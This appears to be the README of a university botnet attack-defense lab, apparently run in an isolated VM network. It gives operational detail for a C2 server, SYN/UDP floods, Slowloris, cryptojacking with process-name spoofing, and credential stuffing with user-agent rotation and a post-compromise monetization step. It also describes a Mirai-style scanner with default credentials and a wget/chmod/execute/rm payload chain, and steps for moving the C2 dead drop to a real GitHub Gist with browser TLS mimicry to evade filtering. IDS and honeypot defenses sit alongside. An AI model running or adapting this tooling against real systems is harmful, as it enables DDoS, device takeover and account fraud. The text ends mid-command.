# Botnet Attack-Defense Research Lab
## AUA CS 232 / CS 337 — Cybersecurity Spring 2026

> **CRITICAL: ALL components run in an isolated virtual machine network (`192.168.100.0/24`) with ZERO external internet connectivity. Verify isolation before running any offensive module. Professor pre-approval required before first run.**

---

## Table of Contents

1. [Project Overview & Research Question](#1-project-overview--research-question)
2. [Architecture: Three-Phase Botnet Evolution](#2-architecture-three-phase-botnet-evolution)
3. [File Reference](#3-file-reference)
4. [VM Network Setup (One-time)](#4-vm-network-setup-one-time)
5. [Compile All C Components](#5-compile-all-c-components)
6. [Deploy Repo to All VMs](#6-deploy-repo-to-all-vms)
7. [Run Everything at Once (Recommended)](#7-run-everything-at-once-recommended)
8. [Manual Attack Reference (per-module)](#8-manual-attack-reference-per-module)
9. [Defensive Systems Reference](#9-defensive-systems-reference)
10. [Understanding the Math](#10-understanding-the-math)
11. [Research Graphs (Week 7 Data Collection)](#11-research-graphs-week-7-data-collection)
12. [Incident Response Report](#12-incident-response-report)
13. [Video Presentation Guide](#13-video-presentation-guide)
14. [Ethics & Safety Checklist](#14-ethics--safety-checklist)

---

## 1. Project Overview & Research Question

**Research Question:** How do modern botnet architectures evolve to evade detection, and what behavioral and mathematical countermeasures are required to detect them when signature-based defenses fail?

**Why it matters in 2026:** The Kimwolf and Aisuru botnets compromised over 2 million devices in the CIS region — including Armenia — in January 2026. Understanding how botnets operate is a prerequisite for building any meaningful defense.

**What this lab builds:**

| Side | What | Language |
|------|------|----------|
| Offensive | C2 server, bot agents, DDoS payloads, IoT propagation scanner, P2P mesh | C + Python |
| Defensive | IDS (4 engines + host monitor), Cowrie honeypot, DPI engine, tarpitting | Python (Scapy, psutil) |
| Research | 3 quantitative graphs, NIST IR report, MITRE ATT&CK mapping | Python (matplotlib) |

---

## 2. Architecture: Three-Phase Botnet Evolution

### Phase 1 — Star Topology (Centralized C2)

A Flask server acts as the C2 hub at `192.168.100.10:5000`. All bots communicate directly via HTTP POST. Commands are delivered AES-128-CBC encrypted. Simple to orchestrate, but one IP takedown kills the entire botnet.

```
  Bot 1 ──► C2 Flask Server ◄── Bot 2
             (192.168.100.10)
```

**Encryption key derivation (both C and Python use identical logic):**
```
AES_KEY = SHA-256("AUA_LAB_2026_KEY")[:16]
IV      = MD5(nonce_string)             # nonce = "%Y-%m-%d-%H-%M"
```

### Phase 2 — Hierarchical Covert Channel

The bot polls a "dead drop" server. In **lab mode** (default), the bot makes plain HTTP GET requests to `192.168.100.10:5001/dead_drop` — unencrypted, to a local IP. In **production threat-model mode**, `DEAD_DROP_URL` is set to a real GitHub Gist raw URL, at which point the bot makes HTTPS requests to `raw.githubusercontent.com` that are genuinely indistinguishable from a developer reading a README (same port 443, same TLS fingerprint, same domain reputation). Commands are AES-CBC encrypted and embedded in HTML comment markers:

```
<!-- CMD:<base64_blob>:CMD -->
```

JA3 TLS fingerprint mimicry: the bot sets Chrome 120's cipher suite order on its SSL context, making its TLS handshake indistinguishable from a real browser.

### Phase 3 — Decentralized P2P (Kademlia DHT)

The centralized server is eliminated. Each bot is a full Kademlia DHT peer. Key properties:

- **160-bit node IDs** derived via `SHA-1(host:port)`
- **XOR distance metric:** `d(x,y) = x XOR y` — governs which bucket each peer goes in
- **K-buckets (k=8):** each bot maintains routing tables only for its k-closest neighbors
- **Sybil resistance:** before evicting the oldest bucket entry, the new peer PINGs the oldest — if it's still alive, the new peer is discarded
- **Command injection:** botmaster calls STORE on the well-known key `SHA-1("botnet_command_v1")`; all bots find it via iterative FIND_VALUE

**Why this defeats takedowns:** Kill 30% of nodes — the remaining mesh reroutes via updated routing tables. No single IP or domain to seize.

### Domain Generation Algorithm (DGA)

Fallback channel if Phase 2/3 is disrupted. The bot generates pseudo-random domains daily using `strftime("%Y-%m-%d")` as seed:

```python
seed = f"{date}-{i}"
domain = sha256(seed)[:10 chars mapped to a-z] + tld_rotation
```

The IDS detects this via two independent alert paths: (1) **NXDOMAIN burst** — ≥10 NXDOMAIN responses from one IP in 30s fires Engine 3 HIGH alert; (2) **high-entropy query burst** — ≥5 domain queries with H > 3.8 bits/char from one IP in 30s fires Engine 3 MED alert. Both paths write to the alert log; the entropy path catches DGA before NXDOMAIN responses even arrive (useful when DNS is slow).

### Payload Suite

| Payload | Layer | Mechanism | Stealth |
|---------|-------|-----------|---------|
| SYN Flood | L4 | Half-open TCP connections exhaust server memory | Low — volumetric spike |
| UDP Flood | L4 | Junk packets saturate bandwidth/CPU | Low — volumetric spike |
| Slowloris | L7 | 150 half-open HTTP connections drip one header/10s | High — looks like slow users |
| Cryptojacking | Host | 25% CPU SHA-256 burn loop, process name spoofed to `kworker/0:1` | Medium — throttled |
| Credential Stuffing | App | 30-pair leaked credential list tested against `/login` | High — mimics human login |

### IoT Propagation (Mirai-Inspired)

Four-step infection lifecycle in `mirai_scanner.c`:

1. **Port scan:** raw SYN probes to Telnet (23, 2323) and SSH (22, 2222)
2. **Brute-force:** 62 default credential pairs from the original Mirai dataset (`admin:admin`, `root:xc3511`, etc.)
3. **Architecture fingerprint:** `/bin/busybox MIRAI && uname -a` identifies MIPS/ARM/x86
4. **Payload delivery + cleanup:** `wget`, `chmod +x`, execute, `rm -f` — binary deleted immediately, payload lives only in RAM

**Persistence Paradox (key research finding):** System wipes are 100% effective at clearing the memory-resident bot — but continuous subnet scanning re-infects default-credential devices within ~3 minutes of reboot. Ephemerality is not a substitute for credential hardening.

**Beyond Telnet/SSH — ADB Exploitation:** Modern botnets like Kimwolf have evolved beyond standard brute-forcing to exploit the Android Debug Bridge (ADB, port 5555), which is frequently left enabled on low-cost Android TV streaming boxes and provides a high-privilege shell with no authentication required. This lab targets Telnet/SSH only, but the ADB vector is architecturally identical: port scan → unauthenticated shell → payload delivery.

**Residential Proxy Evasion:** Real-world botnet operators route scanning traffic through co-opted residential IP addresses so that probes originate from clean consumer IPs that bypass reputation-based perimeter filters. This allows the botnet to reach devices inside institutional Wi-Fi from within, circumventing edge blocklists entirely. Not simulated here (the VM network is host-only), but it explains why Mirai-variant scans are difficult to block at the network perimeter in production.

---

## 3. File Reference

```
botnet_lab/
├── bot_agent.c          C bot agent: heartbeat, AES-encrypted C2 comms,
│                        SYN/UDP flood, Slowloris (C), cryptojack (CPU throttle)
├── mirai_scanner.c      Mirai-inspired IoT propagation scanner (62 cred pairs,
│                        arch fingerprint, payload delivery)
├── kademlia_p2p.c       Phase 3: Full Kademlia DHT in C — 160-bit IDs, XOR
│                        routing, k-buckets, PING/FIND_NODE/STORE/FIND_VALUE RPCs
├── c2_server.py         Phase 1 Flask C2: /register, /heartbeat, /task,
│                        AES-128-CBC task encryption, per-bot task queues
├── covert_bot.py        Phase 2 covert bot + dead-drop server simulator.
│                        Lab default: plain HTTP GET to 192.168.100.10:5001/dead_drop.
│                        Production mode: HTTPS to real GitHub Gist raw URL
│                        (set DEAD_DROP_URL; HTTPS + JA3 mimicry make it indistinguishable
│                        from a developer browsing GitHub). AES-CBC commands, DGA fallback.
├── p2p_node.py          Phase 3 Kademlia DHT in Python (full implementation,
│                        command execution, resilience demo)
├── dga.py               DGA module: strftime seed, SHA-256 domain generation,
│                        Shannon entropy analysis, NXDOMAIN burst simulation
├── slowloris.py         Slowloris: 150-socket pool, keep-alive header drip loop,
│                        auto-refill of dropped connections
├── cryptojack_sim.py    Cryptojacking simulator: duty-cycle CPU throttle,
│                        psutil idle detection, process name spoof
├── cred_stuffing.py     Credential stuffing: bot/jitter/distributed/human modes,
│                        CV timing analysis, human baseline comparison
├── fake_portal.py       Credential stuffing target: Flask /login + /attempts
│                        + tarpit integration + /tarpit/status (exposes
│                        total_flag_events counter for race-free Graph 3 measurement)
├── ids_detector.py      4-engine IDS + host monitor:
│                        Engine 1 — volumetric (SYN/UDP flood)
│                        Engine 2 — behavioral CV timing (credential stuffing)
│                                   + tarpit feedback loop
│                        Engine 3 — DNS/DGA: NXDOMAIN burst AND high-entropy
│                                   query burst (both fire IDS alerts)
│                        Engine 4 — DPI/covert channel (repeated HTTPS polling)
│                        Host    — ghost process + name spoof + CPU spike
├── firewall_dpi.py      iptables egress rules + Scapy DPI: SNI extraction,
│                        Slowloris detection, TTD measurement for Graph 1
├── honeypot_setup.py    Cowrie setup, iptables redirect, MITRE ATT&CK log
│                        analyzer, NIST SP 800-61r3 IR report generator
├── cowrie.cfg           Cowrie config: MIPS IoT fingerprint, SSH+Telnet
├── generate_graphs.py   3 research graphs; auto-loads real JSON data if present,
│                        falls back to simulated values. --status flag shows what
│                        data is missing; --out <dir> sets output directory.
├── collect_graph23_data.py  Week 7 automated data collection helper.
│                        --graph2: interactive wipe-cycle MTBI recorder (victim VM).
│                        --graph3: automated jitter sweep → TPR/FPR (bot VM).
│                        Uses total_flag_events (race-free) as primary detection proxy.
│                        Human baseline runs 60s (not 30s) for sufficient CV data.
│                        Writes graph2_measured_data.json + graph3_measured_data.json.
├── tarpit_state.py      IDS → portal shared state for credential-stuffing tarpitting.
│                        JSON-file IPC (/tmp/tarpit_state.json); TTL = 300s.
│                        Tracks total_flag_events counter (cumulative, survives TTL expiry).
│                        CLI: python3 tarpit_state.py [list | flag <ip> |
│                             unflag <ip> | clear | count]
├── run_full_lab.sh      Master orchestration script — runs everything at once
├── ip_reputation.py     IP reputation & proxy-pool scoring module.
│                        Scores every /login request for bot indicators:
│                          • Datacenter/hosting subnet detection
│                          • Suspicious User-Agent strings (urllib, curl, etc.)
│                          • Missing Accept-Language header (common in scripts)
│                          • Chrome UA without Sec-Ch-Ua (impersonation)
│                          • Cross-IP fingerprint reuse (proxy pool detection)
│                          • X-Forwarded-For subnet cycling
│                        Shared module between fake_portal.py and IDS Engine 6.
│                        CLI demo: python3 ip_reputation.py
│
├── monetization_sim.py  Post-compromise monetization simulator.
│                        Models what attackers do after obtaining valid hits:
│                          1. Gift-card / loyalty balance drain
│                          2. Fraudulent order with saved payment method
│                          3. Account resale listing (Telegram/dark-web sim)
│                          4. Password pivot — 30% simulated reuse rate
│                             tested against 6 other simulated services
│                          5. Verified combo-list export → /tmp/verified_hits.txt
│                        Triggered by: python3 cred_stuffing.py --monetize
│                        CLI: python3 monetization_sim.py [--hits email:pass ...]
│
├── breach_dump.txt      Simulated breach credential dump (200+ pairs).
│                        email:password format, mirrors Collection #1 style.
│                        Loaded with: python3 cred_stuffing.py --creds-file breach_dump.txt
│                        Add to .gitignore — never commit to a public repo.
└── README.md            This file
```

---

## 4. VM Network Setup (One-time)

### Step 1 — Create Host-Only Network in VirtualBox

**File → Tools → Network Manager → Create**

- Adapter tab: IPv4 = `192.168.100.1`, Mask = `255.255.255.0`
- DHCP Server tab: **uncheck** "Enable Server"
- Click Apply

### Step 2 — Create Base Ubuntu VM

New → Name: `Ubuntu-Base` → Ubuntu Server ISO → Skip Unattended → 1 GB RAM, 2 CPU, 20 GB disk → Finish

Settings → Network → Adapter 1 → **Host-Only Adapter** → select the network above → Start → Install Ubuntu Server → at final login screen:

```bash
sudo shutdown now
```

### Step 3 — Clone 4 VMs

Right-click `Ubuntu-Base` → Clone → **Generate new MAC addresses** → **Full Clone**

Create exactly these 4 clones:

| VM Name | IP | RAM | Role |
|---|---|---|---|
| `c2-server` | `192.168.100.10` | 1 GB | Flask C2, botmaster console, P2P seed |
| `bot-agent-1` | `192.168.100.11` | 1 GB | Primary C bot, DDoS, Mirai scanner |
| `bot-agent-2` | `192.168.100.12` | 1 GB | Secondary bot, P2P peer |
| `victim-honeypot` | `192.168.100.20` | 1 GB | Apache target, Cowrie, IDS |

### Step 4 — Configure Each VM (repeat for all 4)

**a) Give temporary internet access:** VM Settings → Network → Adapter 1 → NAT

**b) Inside the VM:**

```bash
# Find interface name
ip a   # typically enp0s3

# Enable DHCP temporarily
sudo nano /etc/netplan/00-installer-config.yaml
```

```yaml
network:
  version: 2
  ethernets:
    enp0s3:
      dhcp4: true
```

```bash
sudo netplan apply
ping -c 4 8.8.8.8    # must work
```

**c) Install packages:**

```bash
sudo apt update
sudo apt install -y openssh-server python3 python3-pip gcc make \
    libpcap-dev libssl-dev nmap wireshark-common tcpdump net-tools \
    apache2 sshpass
pip3 install flask scapy psutil requests pycryptodome matplotlib
```

*Victim VM only:*

```bash
pip3 install cowrie
# OR: follow https://cowrie.readthedocs.io/en/latest/INSTALL.html
```

**d) Set static IP and re-isolate:**

```bash
sudo nano /etc/netplan/00-installer-config.yaml
```

```yaml
network:
  version: 2
  ethernets:
    enp0s3:
      addresses: [192.168.100.XX/24]   # .10 / .11 / .12 / .20
      nameservers:
        addresses: [192.168.100.1]
```

```bash
sudo netplan apply
sudo shutdown now
```

VM Settings → Network → Adapter 1 → **Host-Only Adapter** (back to isolated)

**e) Start VM and verify isolation (NON-NEGOTIABLE):**

```bash
ping 8.8.8.8           # MUST timeout
ping 192.168.100.10    # MUST work
```

### Step 5 — Enable SSH from Your Host

```bash
# From your Windows/Mac host terminal:
ssh vboxuser@192.168.100.10
ssh vboxuser@192.168.100.11
ssh vboxuser@192.168.100.12
ssh vboxuser@192.168.100.20
```

Set hostname so you don't confuse terminals:

```bash
sudo hostnamectl set-hostname c2-server   # or bot-agent-1, etc.
bash
```

---

## 5. Compile All C Components

Run these on every bot VM (`192.168.100.11`, `192.168.100.12`) and the C2 VM:

```bash
# Bot agent (with full payload suite — SYN, UDP, Slowloris, Cryptojack)
gcc -o bot_agent bot_agent.c -lpthread -lssl -lcrypto

# Mirai-inspired IoT propagation scanner
gcc -o mirai_scanner mirai_scanner.c -lpthread

# Phase 3 Kademlia P2P DHT (C implementation)
gcc -o kademlia_p2p kademlia_p2p.c -lpthread -lssl -lcrypto -lm
```

Expected output: no errors, three executables in the current directory.

**Verify:**

```bash
./bot_agent --help 2>/dev/null || echo "bot_agent compiled OK (no help flag)"
./mirai_scanner 2>&1 | head -3
./kademlia_p2p --demo
```

---

## 6. Deploy Repo to All VMs

From your host machine (or C2 VM if you have SSH keys set up):

```bash
# Clone or copy the repo to each VM under ~/lab/
for IP in 192.168.100.10 192.168.100.11 192.168.100.12 192.168.100.20; do
    sshpass -p "pass" scp -r ./botnet_lab/ vboxuser@$IP:~/lab/
    sshpass -p "pass" ssh vboxuser@$IP "cd ~/lab && \
        gcc -o bot_agent bot_agent.c -lpthread -lssl -lcrypto && \
        gcc -o mirai_scanner mirai_scanner.c -lpthread && \
        gcc -o kademlia_p2p kademlia_p2p.c -lpthread -lssl -lcrypto -lm && \
        echo 'Compile OK on $IP'"
done
```

---

## 7. Run Everything at Once (Recommended)

This is the single command that orchestrates the full lab — all three phases, all seven attack scenarios, DPI measurement, Cowrie forensics, and graph generation. Run it from the **C2 VM** (`192.168.100.10`).

```bash
cd ~/lab
chmod +x run_full_lab.sh

# Run the full lab (all phases)
sudo ./run_full_lab.sh

# Or run a single phase (both space and = forms work):
sudo ./run_full_lab.sh --phase 1     # Phase 1: star C2 + all payloads + DPI
sudo ./run_full_lab.sh --phase=2     # Phase 2: covert channel only
sudo ./run_full_lab.sh --phase 3     # Phase 3: P2P Kademlia only

# Clean up all running processes, tarpit state and iptables rules:
sudo ./run_full_lab.sh --clean
```

### What the script does, in order:

| Step | What happens | Duration |
|------|---|---|
| Isolation check | Verifies `ping 8.8.8.8` fails | ~5s |
| C2 server start | Flask C2 up on port 5000 | ~5s |
| Fake portal start | Flask login target on victim:80 | ~5s |
| IDS start | 3-engine Scapy IDS on victim | ~5s |
| Cowrie start | SSH/Telnet honeypot on victim:2222/2323 | ~10s |
| Bot registration | Both C bots connect to C2, heartbeats begin | ~10s |
| **SYN Flood** | 20s attack → IDS fires volumetric alert | ~25s |
| **UDP Flood** | 15s attack → IDS fires volumetric alert | ~20s |
| **Slowloris** | 30s attack → Apache thread exhaustion | ~35s |
| **Cryptojacking** | 30s simulation → IDS detects sustained CPU | ~35s |
| **Credential Stuffing** | bot+jitter modes → IDS CV timing analysis | ~40s |
| **DGA** | NXDOMAIN burst → IDS entropy alert | ~20s |
| **Mirai Propagation** | Scanner finds Cowrie → logs brute-force | ~25s |
| DPI measurement | Graph 1 TTD data collection | ~65s |
| Cowrie forensics | ATT&CK analysis + IR report | ~10s |
| **Phase 2 covert** | Dead-drop command → bot polls and executes | ~75s |
| **Phase 3 P2P** | 5-node DHT mesh → inject → kill seed → survive | ~60s |
| Graph generation | 3 PNG graphs to `/tmp/botnet_graphs/` | ~5s |

**Total runtime:** ~8–10 minutes

### Output files after full run:

```
/tmp/botnet_graphs/graph1_dpi_vs_portblocking.png
/tmp/botnet_graphs/graph2_persistence_paradox.png
/tmp/botnet_graphs/graph3_ids_accuracy.png
./incident_report.md                 (NIST SP 800-61r3 IR report — written to current directory)
./graph1_measured_data.json          (real TTD measurements from DPI engine)
/tmp/c2_server.log                   (C2 activity log)
/tmp/ids.log                         (IDS alerts — on victim VM)
~/.cowrie/var/log/cowrie/cowrie.json (honeypot log — on victim VM)
```

---

## 8. Manual Attack Reference (per-module)

Use these commands if you want to run individual scenarios for debugging or video capture.

### 8.1 Phase 1 — Star C2

```bash
# C2 VM: start C2 server
python3 c2_server.py

# Bot VMs: start bots
sudo ./bot_agent

# Push tasks (from any VM with curl)
curl -X POST http://192.168.100.10:5000/task \
     -H "Content-Type: application/json" \
     -H "X-Auth-Token: LAB_RESEARCH_TOKEN_2026" \
     -d '{"bot_id":"all","type":"syn_flood","target_ip":"192.168.100.20","target_port":80,"duration":15}'

# Available task types and their type-specific optional fields:
#
#   "syn_flood"     — raw TCP SYN flood
#   "udp_flood"     — raw UDP flood (target_port ignored — all impls randomize dst port)
#   "slowloris"     — HTTP thread exhaustion
#   "cryptojack"    — CPU burn simulation
#                     extra: "cpu" float 0-1 (default 0.25)
#   "cred_stuffing" — credential stuffing via cred_stuffing.py
#                     extra: "mode"    "bot"|"jitter"|"distributed" (default "jitter")
#                            "jitter"  int ms std-dev              (default 200)
#                            "workers" int threads (distributed)   (default 3)
#   "dga_search"    — DGA NXDOMAIN burst via dga.py
#   "idle"          — no-op
#
# All type-specific fields are forwarded verbatim through AES encryption
# to the bot — whatever you put in the POST body arrives at the bot unchanged.

# Cryptojack at 40% CPU for 60 s:
curl -X POST http://192.168.100.10:5000/task \
     -H "Content-Type: application/json" \
     -H "X-Auth-Token: LAB_RESEARCH_TOKEN_2026" \
     -d '{"bot_id":"all","type":"cryptojack","duration":60,"cpu":0.40}'

# Credential stuffing in jitter mode:
curl -X POST http://192.168.100.10:5000/task \
     -H "Content-Type: application/json" \
     -H "X-Auth-Token: LAB_RESEARCH_TOKEN_2026" \
     -d '{"bot_id":"all","type":"cred_stuffing","target_ip":"192.168.100.20",
          "target_port":80,"duration":120,"mode":"jitter","jitter":500}'

# Credential stuffing in distributed mode:
curl -X POST http://192.168.100.10:5000/task \
     -H "Content-Type: application/json" \
     -H "X-Auth-Token: LAB_RESEARCH_TOKEN_2026" \
     -d '{"bot_id":"all","type":"cred_stuffing","target_ip":"192.168.100.20",
          "target_port":80,"duration":120,"mode":"distributed","workers":3}'

# Note: tasks are AES-128-CBC encrypted on delivery to bots that registered
# with "enc":1 (set by bot_agent.c at registration time). The C2 server
# tracks this per-bot via the supports_enc flag — bots registered without
# it receive plaintext for backward compatibility with legacy agents.
# bot_agent.c also handles the update_secret command, re-deriving its AES
# key from the new secret so Phase 1 C bots fully participate in key
# rotation alongside Phase 2 and Phase 3 bots.

# View registered bots
curl http://192.168.100.10:5000/bots

# Receive a result from a bot (bots POST here after task completion)
# Note: /result is POST-only; GET returns 405
curl -X POST http://192.168.100.10:5000/result \\
     -H "Content-Type: application/json" \\
     -H "X-Auth-Token: LAB_RESEARCH_TOKEN_2026" \\
     -d '{"bot_id":"bot_hostname_1234","result":"task complete"}'

# Debug endpoint: test AES round-trip on any JSON payload
curl -X POST http://192.168.100.10:5000/encrypt_test \
     -H "Content-Type: application/json" \
     -d '{"type":"syn_flood","target_ip":"192.168.100.20"}'
# Returns: {"original":..., "encrypted":..., "decrypted":..., "key_hex":"..."}
```

### 8.2 SYN Flood (direct)

```bash
# From bot VM, with C2 pushing the task as above.
# Or run directly:
sudo ./bot_agent   # waits for C2 task

# Monitor from victim VM:
sudo tcpdump -i enp0s3 'tcp[tcpflags] & tcp-syn != 0' -c 50
```

### 8.3 Slowloris

```bash
# From bot VM:
python3 slowloris.py  # targets 192.168.100.20:80, 150 sockets, 60s

# Monitor from victim VM:
watch -n 1 "sudo ss -tn | grep :80 | wc -l"
# Apache 2.4 defaults to MaxRequestWorkers 256; 150 Slowloris sockets will
# substantially degrade throughput but will not fully exhaust the thread pool
```

### 8.4 Cryptojacking

```bash
# From any VM:
python3 cryptojack_sim.py --duration 60 --cpu 0.25

# Monitor with psutil on the same VM:
python3 -c "import psutil,time; [print(f'CPU: {p.cpu_percent()}% | name: {p.name()}') \
  or time.sleep(2) for p in psutil.process_iter(['cpu_percent','name']) \
  if p.info['cpu_percent'] > 15]"

# Or:
python3 cryptojack_sim.py --duration 30 --analyze
```

### 8.5 Credential Stuffing

```bash
# Victim VM: start target portal
sudo python3 fake_portal.py   # listens on :80

# Bot VM: run credential stuffing in different modes
python3 cred_stuffing.py --mode bot       --interval 300 --jitter 0
python3 cred_stuffing.py --mode jitter    --interval 500 --jitter 300
python3 cred_stuffing.py --mode distributed --workers 3
python3 cred_stuffing.py --mode human     # baseline (should NOT trigger IDS)

# View portal attempt log:
curl http://192.168.100.20/attempts | python3 -m json.tool
```bash
# ── NEW: Load credentials from a breach dump file ──────────────────────────
# Simulates the attacker sourcing step (Collection #1, stealer logs,
# Telegram combo lists). Without --creds-file the default 30-pair list is used.
python3 cred_stuffing.py --creds-file breach_dump.txt --mode bot
 
# ── NEW: UA rotation (raises bar for IDS Engine 6) ────────────────────────
# Without --ua-rotate, all requests share User-Agent "Mozilla/5.0
# (compatible; Research/1.0)" — a trivial fingerprint target for Engine 6.
# With --ua-rotate, each request picks randomly from 8 real browser UA strings
# (Chrome/Firefox/Safari on Windows/macOS/Linux), varying the fingerprint hash.
python3 cred_stuffing.py --mode distributed --workers 3 --ua-rotate
 
# ── NEW: Monetization pipeline ────────────────────────────────────────────
# Runs monetization_sim.py on all valid hits after the attack completes.
python3 cred_stuffing.py --mode bot --monetize
 
# ── Full production-model attack ──────────────────────────────────────────
python3 cred_stuffing.py \
    --creds-file breach_dump.txt \
    --mode distributed --workers 4 \
    --ua-rotate \
    --monetize \
    --host 192.168.100.20 --port 80
 
# ── Existing modes (unchanged) ────────────────────────────────────────────
python3 cred_stuffing.py --mode bot       --interval 300 --jitter 0
python3 cred_stuffing.py --mode jitter    --interval 500 --jitter 300
python3 cred_stuffing.py --mode distributed --workers 3
python3 cred_stuffing.py --mode human     # FPR baseline (should NOT trigger IDS)
```
 
**--ua-rotate teaching point:**
Run the same distributed attack with and without the flag:
 
```bash
# Without rotation: all 4 workers share one fingerprint → Engine 6 fires
python3 cred_stuffing.py --mode distributed --workers 4
 
# With rotation: fingerprint varies per request → Engine 6 silent
python3 cred_stuffing.py --mode distributed --workers 4 --ua-rotate
```
 
This demonstrates the arms-race dynamic from the article: "Block IPs?
They rotate. Fingerprint devices? They use anti-detect browsers."
A more complete defense would add TLS JA3 fingerprinting, which would
still catch bots even with HTTP-header rotation (not implemented here).
 
**--creds-file teaching point:**
A breach dump loaded with `--creds-file breach_dump.txt` contains ~200
pairs including many emails never registered on `fake_portal.py`.  This
immediately triggers IDS Engine 5's unknown-account-spike alert — even
at jitter levels too high for Engine 2's CV timing to detect.
```

### 8.6 DGA

```bash
# Show entropy analysis for today's generated domains:
python3 dga.py

# Expected output:
#   Domain              Entropy (bits/char)   Classification
#   bcahfdegij.com           3.4591            natural      ← below 4.0
#   xkjqpvzmwn.net           3.9812            LIKELY DGA
```

### 8.7 Mirai IoT Propagation

```bash
# Victim VM: ensure Cowrie is running
cowrie start
tail -f ~/.cowrie/var/log/cowrie/cowrie.json | python3 -m json.tool

# Bot VM: run scanner
sudo ./mirai_scanner

# Expected C2 sequence logged by Cowrie:
#   1. SSH/Telnet brute-force (62 pairs)
#   2. /bin/busybox MIRAI       → T1059.004
#   3. uname -a                  → T1082
#   4. wget http://C2/payload.mips  → T1105
#   5. chmod +x /tmp/.x          → T1222
#   6. rm -f /tmp/.x             → T1070.004
```

> **Note:** `mirai_scanner.c` hard-skips IPs `.10`, `.11`, and `.12` in the scan loop
> to avoid scanning the C2 and bot VMs. The scanner targets `.1`–`.30` (excluding those
> three), so only `192.168.100.20` (the victim) will have Cowrie listening.
> If you add a third bot VM at a different address (e.g. `.13`), it will be scanned.

### 8.8 Phase 2 — Covert Channel

```bash
# C2 VM: start both servers
python3 c2_server.py &           # port 5000
python3 covert_bot.py server &   # port 5001 (dead drop)

# Inject a command into the dead drop
curl -X POST http://192.168.100.10:5001/set_command \
     -H "Content-Type: application/json" \
     -d '{"type":"syn_flood","target":"192.168.100.20","duration":15}'

# Bot VM: run covert bot (will poll every ~60s ± 15s jitter)
python3 covert_bot.py

# Utility commands:
python3 covert_bot.py encode '{"type":"syn_flood","target":"192.168.100.20"}'
python3 covert_bot.py decode '<paste_blob>'
python3 covert_bot.py rotate NEW_KEY_2026_XYZ  # rotate key via dead-drop /push_key

# Wipe command from dead drop (bot goes idle next poll):
curl -X POST http://192.168.100.10:5001/clear_command
```

**Using a real GitHub Gist as the dead drop (production threat model):**

This changes the C2 channel from an internal Flask server to a public GitHub URL. A bot making HTTPS requests to `raw.githubusercontent.com` is indistinguishable from a developer reading a README — port blocking and IP reputation filters cannot stop it.

```bash
# 1. Create a secret Gist at https://gist.github.com (any filename, e.g. notes.md)
# 2. Generate a GitHub PAT at https://github.com/settings/tokens
#    → Check only the 'gist' scope

# 3. Export credentials (never commit these):
export GIST_ID="a1b2c3d4e5f6..."       # hex ID from the Gist URL
export GITHUB_TOKEN="ghp_xxxxxxxxxxxx" # PAT with gist scope

# 4. Push a command to the Gist (botmaster side):
python3 covert_bot.py gist '{"type":"syn_flood","target":"192.168.100.20","duration":20}'
# Output includes the raw URL — copy it for the next step.

# 5. Point bots at the raw Gist URL (edit covert_bot.py before deploying):
#    DEAD_DROP_URL = "https://gist.githubusercontent.com/<user>/<gist_id>/raw"

# 6. To silence bots:
python3 covert_bot.py gist '{"type":"idle"}'

# 7. Rotate key (see below) — then push next command encoded with new key.
```

**AES key rotation — Phase 1 (C2 server) and Phase 2 (dead drop) simultaneously:**

```bash
# Rotate via C2 server (queues update_secret to all Phase 1 bots):
curl -X POST http://192.168.100.10:5000/rotate_key \
     -H "Content-Type: application/json" \
     -H "X-Auth-Token: LAB_RESEARCH_TOKEN_2026" \
     -d '{"secret":"NEW_KEY_2026_XYZ"}'
# Returns: {"status":"rotated","bots_notified":N,"new_key_hex":"..."}

# Also rotate via dead-drop server (queues update_secret to all Phase 2 bots):
curl -X POST http://192.168.100.10:5001/push_key \
     -H "Content-Type: application/json" \
     -d '{"secret":"NEW_KEY_2026_XYZ"}'

# Shortcut CLI for the dead-drop rotation:
python3 covert_bot.py rotate NEW_KEY_2026_XYZ
```

> **Rotation sequence (all phases):**
> 1. Call `POST /rotate_key` on the C2 server (Phase 1) and `POST /push_key` on the dead-drop server (Phase 2) with the **same** new secret.
> 2. Phase 3 P2P nodes receive `update_secret` through the DHT on their next `POLL_SEC` cycle — inject it via `--inject '{"type":"update_secret","secret":"…"}'` on the C2 node if needed.
> 3. Wait ≥ one full poll cycle (up to 75 s for Phase 2 bots) for all bots to pick up the command and switch their local key.
> 4. Restart both servers so their in-process key state matches (they revert to `SHARED_SECRET` / `AUA_LAB_2026_KEY` on restart unless the constant is updated).
> 
> The `update_secret` command is always encrypted with the **current** (old) key so in-flight bots can still decrypt it. Bots that miss the rotation window (e.g. offline during step 3) will be unable to decrypt subsequent tasks until manually re-keyed.

**All supported command types for the Phase 2 covert bot:**

| `type` | Description | Extra fields |
|---|---|---|
| `syn_flood` | Raw SYN flood via Scapy | `target`, `port`, `duration` |
| `udp_flood` | Raw UDP flood via Scapy | `target`, `duration` |
| `slowloris` | 150-socket HTTP exhaustion | `target`, `port`, `duration` |
| `cryptojack` | CPU burn loop | `duration`, `cpu` (0.0–1.0) |
| `cred_stuffing` | Credential stuffing against `/login` | `target`, `port`, `duration`, `mode` (`"bot"`/`"jitter"`/`"distributed"`), `jitter` (ms), `workers` |
| `stop_all` | Cancel all active attacks | — |
| `shutdown` | Gracefully exit the bot process | — |
| `dga_search` | Trigger DGA NXDOMAIN sweep (fallback demo) | — |
| `update_secret` | Rotate the shared AES key at runtime | `secret` (≥8 chars) |
| `idle` | No-op | — |

**`covert_bot.py` CLI mode reference:**

| Mode | Invocation | Purpose |
|---|---|---|
| *(default)* | `python3 covert_bot.py` | Run as bot agent — poll dead drop, execute commands |
| `server` | `python3 covert_bot.py server` | Run dead-drop Flask server on port 5001 (C2 VM) |
| `encode` | `python3 covert_bot.py encode '{"type":…}'` | AES-encode a command dict and print the `<!-- CMD:…:CMD -->` marker |
| `decode` | `python3 covert_bot.py decode <blob>` | Decode and print a base64 blob from a dead drop |
| `gist` | `python3 covert_bot.py gist '{"type":…}'` | Push encoded command to a GitHub Gist via API (requires `GIST_ID` + `GITHUB_TOKEN`) |
| `rotate` | `python3 covert_bot.py rotate <new_secret>` | Rotate shared AES key via dead-drop server `POST /push_key`; also forwards to Phase 1 C2 |


### 8.9 Phase 3 — Kademlia P2P (C)

```bash
# C2 VM: seed node
./kademlia_p2p --host 192.168.100.10 --port 7400

# Bot 1 VM: join mesh
./kademlia_p2p --host 192.168.100.11 --port 7400 \
    --bootstrap 192.168.100.10:7400

# Bot 2 VM: join mesh
./kademlia_p2p --host 192.168.100.12 --port 7400 \
    --bootstrap 192.168.100.10:7400

# Inject command via any node (uses a temporary port 7401)
./kademlia_p2p --host 192.168.100.10 --port 7401 \
